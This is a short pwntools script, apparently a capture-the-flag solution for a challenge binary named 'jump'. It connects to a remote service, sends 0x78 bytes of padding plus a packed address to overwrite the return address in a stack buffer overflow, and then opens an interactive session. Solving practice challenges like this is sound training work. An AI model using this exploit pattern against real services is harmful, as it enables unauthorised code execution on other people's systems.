from pwn import *

#p = process("./jump")
#gdb.attach(p)
p = remote("forever.isss.io", 1303)

payload = b"A"*0x78
payload += p64(0x4011c7)

p.recvuntil(b"input")
p.sendline(payload)

p.interactive()
